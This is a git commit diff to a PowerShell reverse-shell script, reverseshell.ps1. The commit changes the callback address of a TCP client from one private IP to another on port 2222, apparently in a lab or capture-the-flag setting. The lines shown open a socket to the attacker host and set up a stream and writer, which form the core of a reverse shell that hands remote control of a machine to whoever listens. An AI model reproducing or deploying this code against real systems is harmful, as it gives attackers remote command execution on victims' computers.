d2284e24172653509da7c7330e0d4b4d83f206f9
TrojanKiller94 <157858145+TrojanKiller94@users.noreply.github.com>
2024-01-27 03:50:29 +0300

    Update reverseshell.ps1

--- reverseshell.ps1
+++ reverseshell.ps1
@@ -1,4 +1,4 @@
-$socket = new-object System.Net.Sockets.TcpClient('10.10.14.14', 2222);
+$socket = new-object System.Net.Sockets.TcpClient('10.10.16.101', 2222);
 if($socket -eq $null){exit 1}
 $stream = $socket.GetStream();
 $writer = new-object System.IO.StreamWriter($stream);
